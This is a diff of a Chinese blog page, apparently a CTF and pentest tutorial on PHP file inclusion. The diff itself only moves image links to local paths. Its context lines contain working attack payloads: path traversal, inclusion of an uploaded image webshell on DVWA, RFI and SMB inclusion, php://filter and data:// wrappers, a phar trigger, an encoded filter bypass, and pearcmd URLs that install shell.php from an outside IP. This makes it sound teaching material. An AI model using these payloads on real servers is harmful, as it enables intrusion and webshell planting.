@@ -27,7 +27,7 @@
 
 <h3 id="（1）使用绝对路径"><a href="#（1）使用绝对路径" class="headerlink" title="（1）使用绝对路径"></a>（1）使用绝对路径</h3><p>使用绝对路径直接读取:</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778121955759-bb3b2428-a265-472a-8194-969e199b2e2b.png"></p>
+<p><img src="/image/file-include/01-1778121955759-bb3b2428-a265-472a-8194-969e199b2e2b.png"></p>
 <h3 id="（2）使用相对路径进行读取"><a href="#（2）使用相对路径进行读取" class="headerlink" title="（2）使用相对路径进行读取"></a>（2）使用相对路径进行读取</h3><p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。</p>
 <p>例如当前页面所在路径为<font style="background-color:#FBDE28;">C:\Apache24\htdocs\</font>，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：</p>
 <p><font style="background-color:#FBDE28;">..&#x2F;..&#x2F;windows&#x2F;system.ini</font></p>
@@ -55,16 +55,16 @@
 
 <p>找到上传点进行上传：</p>
 <!-- 这是一张图片，ocr 内容为：VULNERABILITY:FILE UPLOAD CHOOSE AN IMAGE TO UPLOAD: 未选择文件 选择文件 UPLOAD .././HACKABLE/UPLOADS/ABC. JPG SUCCESFULLY UPLOADED! CSDN@CAKER -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778124420362-66f9e7e3-b10a-4d97-8c60-6b64008762e3.png"></p>
+<p><img src="/image/file-include/02-1778124420362-66f9e7e3-b10a-4d97-8c60-6b64008762e3.png"></p>
 <p>文件保存的完整路径为：</p>
 <p>DVWA平台low等级文件包含漏洞页面如下：</p>
 <!-- 这是一张图片，ocr 内容为：WWW.DYWA.COM/VULNERABILITIES/FI/?PAGEFILE1.PHP DVWA VULNERABILITY:FILE INCLUSION HOME INSTRUCTIONS FILE 1 SETUP/RESET DB HELLO ADMIN YOUR IPADDRESS IS:127.0.0.1 BRUTE FORCE [BACK] COMMAND INJECTION CSDN @CAKER` CSRF -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778124447046-c777901c-506c-406e-b983-8708e71fff81.png"></p>
+<p><img src="/image/file-include/03-1778124447046-c777901c-506c-406e-b983-8708e71fff81.png"></p>
 <p>该页面用于读取C:\phpStudy\WWW\vulnerabilities\fi\路径中的文件，代码如下：</p>
 <!-- 这是一张图片，ocr 内容为：< ?php DISPLAY THE WISH TO PAGE ]: $FILE $ _GET[ PAGE CSDN@CAKER\ -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778124489890-72a4de00-8602-486a-9ae2-8707133e16e7.png"></p>
+<p><img src="/image/file-include/04-1778124489890-72a4de00-8602-486a-9ae2-8707133e16e7.png"></p>
 <p>现在我们利用该页面去执行我们上传的图片马</p>
-<p>构造URL如下，代码成功解析，我这里使用的phpinfo进<!-- 这是一张图片，ocr 内容为：不安全| AN GE WWW.DVWA.COM/VULNERABILITIES/FI/?PAGE-.//HACKABLELUPLOADS\ABCJPG  -ANNA - - - - - -  - - - - - - - - - - - - - - - - - - - - - -ANNA GANGA RANGAR INB0660H5AEQ'GFTOE/BOTEISESPESPE(996/65706-CY06611909099999999999999999999999999999999969706579690999 OFMOSO 0000W0101601001001800000208 食 2&HBO OPOPAS:0000010+OHO00000000000010.SYOOUO(OSOOOOOOLO POX12 ID_000000082262:021%201ON2502P0P 2000002BDWF212 GAGTALE PHP VERSION 7.3.4 PHP WINDOWS NT LAPTOP-86D4333S 10.0 BUILD 19044 (WINDOWS 10)AMD64 SYSTEM BUILD DATE APR 2 2019 21:50:57 MSVC15(VISUAL C++2017) COMPILER ARCHITECTURE X64 CONFIGURE COMMAND ISNAP-BULDIDEPS AUXIORADEX64UNSTANTCIENT,12 11SDK SHARED"--NVITH-OD8-12C-CIPHP-SNAP BUIDIDEPS AUXIORADELX64UNSTANTCIENT 12 11SDK SHARED'"-ENABLE-OBJECT-OUL-DRE,JOBY"-ENABLE-COML- DOTNET-SHARED"-WITHOUT-ANALYZER""-WITH-PGO" SERVER API VIRTUAL DIRECTORY SUPPORT DISABLED CONFIGURATION FILE (PHP.INI)PATH C:WINDOWS D:ISTUDYLAPACHE-TOMCAT.8.5.33XIAOPIPHPSTUDY PROLEXTENSIONSIONSIPHP7 3.4NTSIPHPINI LOADED CONFIGURATION FILE SCAN THIS DIR FOR ADDITIONAL .INI FILES (NONE) ADDITIONAL INI FILES PARSED (NONE) 20180731 PHP API 20180731 PHP EXTENSION 320180731 ZEND EXTENSION API320180731.NTS.VC15 ZEND EXTENSION BUILD PHP EXTENSION BUILD API20180731,NTS.VC15 CSDN @CAKER\ --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778124524842-750b3f89-887f-43b5-81bc-7a071eff1279.png">行测试，实战直接替换为上述所写的一句话木马即可。</p>
+<p>构造URL如下，代码成功解析，我这里使用的phpinfo进<!-- 这是一张图片，ocr 内容为：不安全| AN GE WWW.DVWA.COM/VULNERABILITIES/FI/?PAGE-.//HACKABLELUPLOADS\ABCJPG  -ANNA - - - - - -  - - - - - - - - - - - - - - - - - - - - - -ANNA GANGA RANGAR INB0660H5AEQ'GFTOE/BOTEISESPESPE(996/65706-CY06611909099999999999999999999999999999999969706579690999 OFMOSO 0000W0101601001001800000208 食 2&HBO OPOPAS:0000010+OHO00000000000010.SYOOUO(OSOOOOOOLO POX12 ID_000000082262:021%201ON2502P0P 2000002BDWF212 GAGTALE PHP VERSION 7.3.4 PHP WINDOWS NT LAPTOP-86D4333S 10.0 BUILD 19044 (WINDOWS 10)AMD64 SYSTEM BUILD DATE APR 2 2019 21:50:57 MSVC15(VISUAL C++2017) COMPILER ARCHITECTURE X64 CONFIGURE COMMAND ISNAP-BULDIDEPS AUXIORADEX64UNSTANTCIENT,12 11SDK SHARED"--NVITH-OD8-12C-CIPHP-SNAP BUIDIDEPS AUXIORADELX64UNSTANTCIENT 12 11SDK SHARED'"-ENABLE-OBJECT-OUL-DRE,JOBY"-ENABLE-COML- DOTNET-SHARED"-WITHOUT-ANALYZER""-WITH-PGO" SERVER API VIRTUAL DIRECTORY SUPPORT DISABLED CONFIGURATION FILE (PHP.INI)PATH C:WINDOWS D:ISTUDYLAPACHE-TOMCAT.8.5.33XIAOPIPHPSTUDY PROLEXTENSIONSIONSIPHP7 3.4NTSIPHPINI LOADED CONFIGURATION FILE SCAN THIS DIR FOR ADDITIONAL .INI FILES (NONE) ADDITIONAL INI FILES PARSED (NONE) 20180731 PHP API 20180731 PHP EXTENSION 320180731 ZEND EXTENSION API320180731.NTS.VC15 ZEND EXTENSION BUILD PHP EXTENSION BUILD API20180731,NTS.VC15 CSDN @CAKER\ --><br><img src="/image/file-include/05-1778124524842-750b3f89-887f-43b5-81bc-7a071eff1279.png">行测试，实战直接替换为上述所写的一句话木马即可。</p>
 <p>注：我们也可以直接在web shell.jpg中写一句话木马，然后再通过文件包含漏洞去连接web shell.jpg，但这种方法有时候web shell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
 <h3 id="日志上传"><a href="#日志上传" class="headerlink" title="日志上传"></a>日志上传</h3><ul>
 <li>寻找日志位置</li>
@@ -94,7 +94,7 @@
 </ul>
 <p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
 <!-- 这是一张图片，ocr 内容为：FILES FILES SESSION.SAVE HANDLER /VAR/LIB/PHP/SESSIONS /VAR/LIB/PHP/SESSIONS SESSION.SAVE PATH SESSION.SERIALIZE HANDLER PHP PHP CSDN@CAKER -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778125192829-74d866aa-e624-40d5-803c-af2e36229fcc.png"></p>
+<p><img src="/image/file-include/06-1778125192829-74d866aa-e624-40d5-803c-af2e36229fcc.png"></p>
 <p>常见路径:</p>
 <ul>
 <li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li>
@@ -106,7 +106,7 @@
 <p>案例：</p>
 <p><a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></p>
 <h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><!-- 这是一张图片，ocr 内容为：HTTP PO ST WITH A FILE ARRIVES PHP BEGINS ANALYSIS PHP CREATES TEMP FILE PHP WRITES DATA TO TEMP FILE PHP CLOSES TEMP FILE SCRIPT EXECUTION BEGINS [OPTIONAL] SCRIPT MOVES UPLOADED FILE SCRIPT EXECUTION ENDS PHP REMOYES TEMP FILES (IF ANY) TIME TIME WINDOW CSDN@CAKER\ -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778125810124-5be342e1-14c3-4a88-9183-176f10eb79be.png"></p>
+<p><img src="/image/file-include/07-1778125810124-5be342e1-14c3-4a88-9183-176f10eb79be.png"></p>
 <p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
 <p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
 <p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
@@ -114,19 +114,19 @@
 <p><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/</a></p>
 <h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p><font style="color:rgb(77, 77, 77);">如果PHP的配置选项</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;allow_url_include&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">、</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;allow_url_fopen&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">状态为ON的话，则</font><strong><font style="color:rgb(77, 77, 77);">include&#x2F;require</font></strong><font style="color:rgb(77, 77, 77);">函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</font></p>
 <!-- 这是一张图片，ocr 内容为：PHP.INIX 826 ; WHETHER TO ALLOW THE TREATMENT OF URLS (LIKE HTTP 827 828 HTTP://PHP.NET/ALLOW-FOPEN 829 ALLOW URL FOPEN ON 830 WHETHER TO ALLOW INCLUDE/REQUIRE TO OPEN URLS 831 (LI 832 HTTP://OHP.NET/ALLOW-URL-INCLUDE ALLOW URL INCLUDE 833 ON CSDN@CAKER` 834 -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778127260308-69b7c298-9a8c-48d9-83b0-bf43ed3ba415.png"></p>
+<p><img src="/image/file-include/08-1778127260308-69b7c298-9a8c-48d9-83b0-bf43ed3ba415.png"></p>
 <p>首先我们来看一段代码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">	$path=$ _GET[&#x27;path&#x27;];</span><br><span class="line">	include($path . &#x27;/phpinfo.php&#x27;);</span><br><span class="line">  //在后面加上phpinfo.php，要截断</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>访问本地site目录下的phpinfo.php文件:</p>
 <!-- 这是一张图片，ocr 内容为：127.0.0.1/INCLUDE.PHPRPATHSITE 电 PHP PHP VERSION 5.5.9 WINDOWS NT LAPTOP-86D4333S 6.2 BUILD 9200 (WINDOWS 8 HOME PREMIUM EDITION) SYSTEM AMD64 BUILD DATE FEB 5 2014 10:59:06 MSVC11(VISUAL C++2012) COMPILER ARCHITECTURE X64 CSCRIPT/NOLOGO CONFIGUREJS"-ENABLE-SNAPSHOT-BUILD"'-ENABLE-DEBUG-PACK" CONFIGURE COMMAND DISABLE-ZTS MSSQL'-WITHOUT-PI3WEB'-WITH-PDO-OCI-CIPHP- SDKLORACLEVINSTANTCLIENT10\SDK,SHARED""--WITH-OCI8-C:IPHP SDK/ORACLE/INSTANTCLIENT10\SDK,SHARED"-WITH-OCI8-11G-C/PHP SDKIORACLEVINSTANTCLIENT1/SDK,SHARED""-WITH-ENCHANT-SHARED''-ENABLE-OBJECT- OUT-DIR-./OBJ/"-ENABLE-COM-DOTNET-SHARED""-WITH-MCRYPT-STATIC"'-DISABLE- STATIC-ANALYZE''-WITH-PGO SERVER API CGL/FASTCGL CSDN @CAKER\ -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778127354141-886af6cd-31b4-47a8-ad79-6eacdad04313.png"></p>
+<p><img src="/image/file-include/09-1778127354141-886af6cd-31b4-47a8-ad79-6eacdad04313.png"></p>
 <p>该页面并没有对$path做任何过滤，因此存在文件包含漏洞。</p>
 <p>我们在远端Web服务器&#x2F;site&#x2F;目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。</p>
 <p>但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用<font style="background-color:#FBE4E7;">%00截断 </font>，这里php版本为7.3.4，不适用。</p>
 <p>还有一种截断方法就是<font style="background-color:#FBE4E7;">?号截断</font>，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：</p>
 <!-- 这是一张图片，ocr 内容为：127.0.1/INCLUDE PHP?PATH-HTTP://192.168.0.102/SITE/TEST.PHP?123123 PHP PHP VERSION 7.3.4 SYSTEM WINDOWS NT LAPTOP-86D4333S 10.0 BUILD 19044 (WINDOWS 10) AMD64 BUILD DATE APR 2 2019 21:50:57 MSVC15 (VISUAL C++2017) COMPILER ARCHITECTURE X64 CSCRIPT/NOLOGO CONFIGUREJS'-ENABLE-SNAPSHOT-BUILD''-ENABLE-DEBUG-PACK'-DISABLE-ZTS''-VITH- CONFIGURE COMMAND PDO-ODISC3PHP-SNAP-BUILDEPS AUXJORACLEX64JINSTANTCFIENT 12.11SDK,SHARED'--VITH-OCIB-12C三CIPHP- SNAP-BUILDEPS,AUXTORACLELX64JINSTANTCFENT 12.11SDK,SHARED'-ENABLE-OBJECT-DIRE./ ENABLE-COM-DOTNET-SHARED""-WITHOUT-ANALYZER""--WITH-PGO" SERVER APL CGI/FASTCGI VIRTUAL DIRECTORY SUPPORT DISABLED CSDN @CAKER C:WINDOWS CONFIGURATION FILE (PHP.INI) PATH -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778127330796-317440cd-7aa3-443d-ae96-67ce1d5b74f1.png"></p>
+<p><img src="/image/file-include/10-1778127330796-317440cd-7aa3-443d-ae96-67ce1d5b74f1.png"></p>
 <p>如果test.php是恶意的web shell文件，那么利用该漏洞就可以获取到服务器权限。</p>
 <h3 id="利用SMB共享"><a href="#利用SMB共享" class="headerlink" title="利用SMB共享"></a><font style="color:rgb(15, 17, 21);">利用SMB共享</font></h3><p><font style="color:rgb(15, 17, 21);">即便PHP环境将 allow_url_include 等选项关闭，PHP底层仍然支持通过SMB协议访问文件。攻击者只需在自己的服务器上配置一个允许匿名访问的SMB共享，并在其中存放恶意代码，然后将目标应用程序的文件包含路径指向这个SMB地址：</font></p>
 <p><strong><font style="color:rgb(38, 38, 38);">攻击者搭建匿名 SMB 共享</font></strong><font style="color:rgb(38, 38, 38);">（Linux 上用 Impacket）：</font></p>
@@ -138,10 +138,10 @@
 <h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p><font style="color:rgb(77, 77, 77);">PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数</font></p>
 <p><font style="color:rgb(77, 77, 77);">如下所示：</font></p>
 <!-- 这是一张图片，ocr 内容为：描述 名称 访问本地文件系统 FILE:// 访问HTTP(S)网址 HTTP:// 访问FTP(S)URLS FTP:// 访问各个输入/输出流(1/0 STREAMS) PHP:// 压缩流 ZLIB:// 数据(RFC2397) DATA:// CSDN @CAKER 查找匹配的文件路径模式 GLOB:// -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778131175661-5083ecf3-8b0c-4545-967f-2ace3367ce40.png"></p>
+<p><img src="/image/file-include/11-1778131175661-5083ecf3-8b0c-4545-967f-2ace3367ce40.png"></p>
 <h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><font style="color:rgb(77, 77, 77);">用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</font></p>
 <!-- 这是一张图片，ocr 内容为：封装协议概要 支持 属性 受ALLOW_URL_FOPEN影响 NO 允许读取 YES 允许写入 YES 允许添加 YES 允许同时读和写 YES 支持STAT() YES 支持UNLINK() YES 支持 RENAME() YES 支持MKDIR() YES 支持RMDIRO YES CSDN@CAKER -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778131443317-5dce3242-97e6-4fc5-8711-193158898beb.png"></p>
+<p><img src="/image/file-include/12-1778131443317-5dce3242-97e6-4fc5-8711-193158898beb.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// [文件的绝对路径和文件名]</span><br><span class="line">eg：</span><br><span class="line">   file:///var/www/html/flag</span><br><span class="line">   开头/被禁改为</span><br><span class="line">   file://localhost/var/www/html/flag</span><br></pre></td></tr></table></figure>
 
 <h3 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php:&#x2F;&#x2F;伪协议"></a>php:&#x2F;&#x2F;伪协议</h3><p><font style="color:rgb(77, 77, 77);">php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;php://filter&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">和</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;php://input&lt;/font&gt;</code></p>
@@ -178,7 +178,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 构造一个包含恶意序列化数据的 phar 文件，扩展名改为 .jpg</span><br><span class="line">2. 通过任意上传点上传 evil.jpg</span><br><span class="line">3. 包含触发：?file=phar://uploads/evil.jpg/test</span><br></pre></td></tr></table></figure>
 
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><!-- 这是一张图片，ocr 内容为：测试PHP版本ALLOW.URL.FOPEN 用法 协议 ALLOW_URL_INCLUDE FILE:// ?FILE-FILE://D://DHPSTUDY/WWWW/PHPCODE.TXT 25.2 OFF/ON OFF/ON ?FILE-PHP://FILTER/READ-CONVERT.BASE64-ENCODE/RESOURCE-/INDEXPHP PHP://FILTER OFF/ON >5.2 OFF/ON [POST DATA] < ?php PHPINFOO?> ?FILEP//INPUT PHP://INPUT OFF/ON >5.2 ON ZIP:// 2FILE-ZIP://D:/SOFT/PHPSTUDY/WWW/FILE.ZIP%23PHPCODE.TXT 25.2 OFF/ON OFF/ON FILE-COMPRESS.BZIP2://D:/SOFT/PHPSTUDY/WWWW/FILE.BZ2 COMPRESS.BZIP2:// [OR] OFF/ON OFF/ON >5.2 ?FILECOMPRESS.BZIP2://FILE.BZ2 ?FILECOMPRESS.ZLIB://D:/SOFT/PHPSTUDY/WWW/FILE.GZ COMPRESS.ZLIB:// [OR] >5.2 OFF/ON OFF/ON ?FILECOMPRESS.ZLIB://FILE.GZ ?FILE DATA://TEXT/OLAIN.<?PHO PHPINFO0?> [OR] FILE-DATA://TEXT/PLAIN;BASE64,PD9WAHAGCGHWAWSMBYGPPZ4 DATA:// 也可以: >5.2 ON ON ?FILEDATA.TEXT/PLAIN`< ?php PHPINFO0?> [OR] FILEDATA:TEXT/PLAIN:BASE64,PD9WAHAGCGHWAW5MBYGP24 -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778132879205-0e36a7eb-2eb9-45d5-be12-2f463011ec08.png"></p>
+<p><img src="/image/file-include/13-1778132879205-0e36a7eb-2eb9-45d5-be12-2f463011ec08.png"></p>
 <h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>1、使用str_replace等方法过滤掉危险字符</p>
 <p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p>
 <p>3、php版本升级，防止%00截断</p>
@@ -190,7 +190,7 @@
 
 <p><font style="color:rgb(51, 51, 51);">可以利用</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;include&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">函数解urlencode的特性来编码绕过：</font></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778144048807-cd810b1b-04eb-41e7-b72d-3eb043f1febc.png"></p>
+<p><img src="/image/file-include/14-1778144048807-cd810b1b-04eb-41e7-b72d-3eb043f1febc.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=index.php</span><br></pre></td></tr></table></figure>
 
 <h2 id="opcache缓存"><a href="#opcache缓存" class="headerlink" title="opcache缓存"></a><font style="color:rgb(0, 0, 0);">opcache缓存</font></h2><p>:::tips<br><font style="color:rgb(119, 119, 119);">一般题目的形式是给到phpinfo，给文件包含或者任意文件读取，flag在flag.php</font></p>
@@ -200,20 +200,20 @@
 <h3 id="寻找路径"><a href="#寻找路径" class="headerlink" title="寻找路径"></a>寻找路径</h3><p>在<font style="background-color:#FBE4E7;">phpinfo.php</font>中寻找</p>
 <p><font style="color:rgb(51, 51, 51);">OPcache通过将PHP脚本预编译的字节码存储到共享内存中来提升PHP的性能， 存储预编译字节码的好处就是省去了每次加载和解析PHP脚本的开销</font></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778145084531-82cae41d-0f98-49ee-ae99-e0658a4e552c.png"></p>
+<p><img src="/image/file-include/15-1778145084531-82cae41d-0f98-49ee-ae99-e0658a4e552c.png"></p>
 <p><font style="color:rgb(51, 51, 51);">他本来是个提升性能的扩展，然而他的配置有一个比较有趣的东西就是 </font><font style="color:rgb(51, 51, 51);background-color:#FBE4E7;">opcache.file_cache</font></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778145084638-7528a7b1-8762-4f22-9f4e-0abf718c8275.png"></p>
+<p><img src="/image/file-include/16-1778145084638-7528a7b1-8762-4f22-9f4e-0abf718c8275.png"></p>
 <p><font style="color:rgb(51, 51, 51);">在&#x2F;var&#x2F;www&#x2F;cache&#x2F;下存在着 PHP 的缓存文件，那么自然也会有 flag.php 的缓存，会在缓存文件夹内以</font><font style="color:rgb(51, 51, 51);background-color:#FBE4E7;">&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php.bin</font><font style="color:rgb(51, 51, 51);">存在，而完整的绝对路径是</font></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/cache/[一个 md5]/ var/www/html/flag.php.bin</span><br><span class="line">md5：由php版本号、zend extension id、Zend Bin ID拼接起来md5</span><br></pre></td></tr></table></figure>
 
 <h2 id="pearcmd装马"><a href="#pearcmd装马" class="headerlink" title="pearcmd装马"></a><font style="color:rgb(0, 0, 0);">pearcmd装马</font></h2><p>pearcmd了解<a href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p>
 <p><font style="color:rgb(51, 51, 51);">在phpinfo中如果看到</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;register_argc_argv&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">开放，可以获取外部的参数，以</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;+&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">作为分隔符 </font></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/jpeg/60539590/1778146014401-434237e8-e940-499a-a98d-1969eae29f5c.jpeg"></p>
+<p><img src="/image/file-include/17-1778146014401-434237e8-e940-499a-a98d-1969eae29f5c.jpeg"></p>
 <p><font style="color:rgb(51, 51, 51);">pearcmd.php是</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;pear&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">命令调用的文件，是用来管理依赖的，类似python的pip。能包含它又能给参数的话，就可以用它来安装木马了：</font></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/60539590/1778146051333-26262db8-669b-4435-bdb8-43acce7d9c00.png"></p>
+<p><img src="/image/file-include/18-1778146051333-26262db8-669b-4435-bdb8-43acce7d9c00.png"></p>
 <h3 id="靶机可出网"><a href="#靶机可出网" class="headerlink" title="靶机可出网"></a>靶机可出网</h3><p><font style="color:rgb(51, 51, 51);">在自己的</font><font style="color:rgb(0, 82, 217);">云主机</font><font style="color:rgb(51, 51, 51);">上准备一个shell（一句话），直接在后台编辑即可</font></p>
 <p><font style="color:rgb(51, 51, 51);">利用方式：</font></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?include=/usr/local/lib/php/pearcmd.php&amp;amp;+install+http://47.109.88.102/shell.php</span><br><span class="line">/?include=/usr/local/lib/php/pearcmd.php&amp;amp;+download+http://47.109.88.102/shell.php</span><br></pre></td></tr></table></figure>
